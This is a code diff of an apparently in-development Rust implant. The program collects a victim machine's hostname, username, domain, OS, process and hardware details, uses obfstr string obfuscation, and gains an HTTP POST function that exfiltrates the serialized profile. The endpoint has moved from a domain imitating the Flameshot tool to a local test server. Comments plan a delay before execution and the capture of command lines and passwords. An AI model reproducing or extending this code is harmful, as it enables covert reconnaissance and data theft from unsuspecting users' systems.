@@ -13,65 +13,8 @@ use collector::link_util::working_dir;
 use std::time::Duration;
 use std::thread;
 
-#[derive(Serialize, Deserialize, PartialEq, Clone)]
-pub struct POD {
-    #[serde(rename = "a")]
-    pub session_id: String,
-    #[serde(rename = "b")]
-    pub hostname: String,
-    #[serde(rename = "c")]
-    pub username: String,
-    #[serde(rename = "d")]
-    pub domain: String,
-    #[serde(rename = "e")]
-    pub arch: String,
-    #[serde(rename = "f")]
-    pub distro: String,
-    #[serde(rename = "g")]
-    pub desktop_env: String,
-    #[serde(rename = "h")]
-    pub cmdline: String,
-    #[serde(rename = "i")]
-    pub working_dir: String,
-    #[serde(rename = "j")]
-    pub process_path: String,
-    #[serde(rename = "k")]
-    pub process_name: String,
-    #[serde(rename = "l")]
-    pub pid: u32,
-    #[serde(rename = "m")]
-    pub parent_name: String,
-    #[serde(rename = "gh")]
-    pub ppid: u32,
-    #[serde(rename = "t")]
-    pub total_memory: String,
-    #[serde(rename = "u")]
-    pub used_memory: String,
-    #[serde(rename = "v")]
-    pub nb_cpu: usize,
-}
-impl std::fmt::Display for POD {
-    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
-        write!(f, "{}",obfstr!("POD Info:\n"))?;
-        write!(f, "{} {}\n",obfstr!("Session ID:"), self.session_id)?;
-        write!(f, "{} {}\n",obfstr!("Hostname:"), self.hostname)?;
-        write!(f, "{} {}\n",obfstr!("Username:"), self.username)?;
-        write!(f, "{} {}\n",obfstr!("Domain:"), self.domain)?;
-        write!(f, "{} {}\n",obfstr!("Architecture:"), self.arch)?;
-        write!(f, "{} {}\n",obfstr!("Distribution:"), self.distro)?;
-        write!(f, "{} {}\n",obfstr!("Desktop Environment:"), self.desktop_env)?;
-        write!(f, "{} {}\n",obfstr!("Command Line:"), self.cmdline)?;
-        write!(f, "{} {}\n",obfstr!("Working Directory:"), self.working_dir)?;
-        write!(f, "{} {}\n",obfstr!("Process Path:"), self.process_path)?;
-        write!(f, "{} {}\n",obfstr!("Process Name:"), self.process_name)?;
-        write!(f, "{} {}\n",obfstr!("PID:"), self.pid)?;
-        write!(f, "{} {}\n",obfstr!("Parent Name:"), self.parent_name)?;
-        write!(f, "{} {}\n",obfstr!("PPID:"), self.ppid)?;
-        write!(f, "{} {}\n",obfstr!("Total Memory:"), self.total_memory)?;
-        write!(f, "{} {}\n",obfstr!("Used Memory:"), self.used_memory)?;
-        write!(f, "{} {}\n",obfstr!("CPU Count:"), self.nb_cpu)
-    }
-}
+use collected_data::POD;
+
 
 fn collector(session_id: &String) -> POD {
     // TODO attendre 5 minutes
@@ -101,9 +44,22 @@ fn collector(session_id: &String) -> POD {
     return post_data
 }
 
-fn send(url: String, data:POD){
-    let encoded: Vec<u8> = bincode::serialize(&data).unwrap();
+fn send(url: String, data:POD) -> Result<(), anyhow::Error> {
+    // Sérialisation bincode → Vec<u8>
+    let encoded: Vec<u8> = bincode::serialize(&data)?;
     println!("encoded");
+
+    // Envoi en HTTP POST
+    let client = reqwest::blocking::Client::new();
+    let response = client
+        .post(url)
+        .header("Content-Type", "application/octet-stream")
+        .body(encoded)
+//        .body("coucou".to_string())
+        .send()?;
+
+    println!("Status: {}", response.status());
+    return Ok(())
 
 }
 
@@ -122,8 +78,9 @@ fn collect_and_send(wait: u64,session_id: String , url: String){
     wait_seconds(wait);
     let post_data :POD = collector(&session_id);
     print!("{:#}", post_data);
-    send(url,post_data);
-}
+    if let Err(e) = send(url, post_data) {
+        eprintln!("Erreur envoi: {e}");
+    }}
 
 fn main() {
     println!("Hello, world!");
@@ -131,7 +88,8 @@ fn main() {
     // TODO attendre 5 minutes
     // chopper des commandline aussi pour le session id et le password
     let session_id="yolo".to_string();
-    let url="https://flameshot.website:8444".to_string();
-    collect_and_send(3,session_id,url)
+    //let url="https://flameshot.website:8444".to_string();
+    let url="http://127.0.0.1:3000/login.php".to_string();
+    collect_and_send(1,session_id,url)
 
 }
